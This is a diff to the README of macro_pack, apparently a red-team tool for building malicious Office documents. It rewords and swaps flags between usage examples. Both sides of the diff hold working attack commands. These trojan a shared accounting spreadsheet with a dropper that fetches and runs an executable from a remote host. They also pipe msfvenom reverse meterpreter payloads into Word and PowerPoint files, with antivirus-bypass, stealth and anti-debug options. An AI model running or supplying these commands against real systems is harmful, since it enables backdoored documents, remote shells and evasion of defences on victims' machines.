@@ -118,9 +118,9 @@ echo http://10.5.5.12:6543/empire_stager.cmd | macro_pack.exe -o -t DROPPER_PS -
 
 ### macro\_pack pro
 
-- Trojan the existing shared "report.xlsm" file with a dropper. Macro is obfuscated and mangled to bypass more antiviruses.
+- Trojan the existing shared "report.xlsm" file with a dropper. Use anti-AV and anti-debug features.
 ```bash
-echo "http://10.5.5.12/drop.exe" "dropped.exe" | macro_pack.exe -o -t DROPPER2 --trojan --av-bypass -X "E:\accounting\report.xlsm"   
+echo "http://10.5.5.12/drop.exe" "dropped.exe" | macro_pack.exe -o -t DROPPER2 --trojan --av-bypass --stealth  -X "E:\accounting\report.xlsm"   
 ```
 
 - Genenerate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV). Keep-alive is needed because we need meterpreter to stay alive before we migrate.
@@ -128,9 +128,9 @@ echo "http://10.5.5.12/drop.exe" "dropped.exe" | macro_pack.exe -o -t DROPPER2 -
 msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --vbom-encode --keep-alive  -W  out.docm
 ```
 
-- Genenerate a PowerPoint file containing reverse meterpreter. Use anti-AV and anti-debug features.
+- Genenerate a PowerPoint file containing reverse meterpreter. Macro is obfuscated and mangled to bypass most antiviruses. 
 ```bash
-msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --stealth --av-bypass -P  hotpics.pptm
+msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --av-bypass -P  hotpics.pptm
 ```
 
 
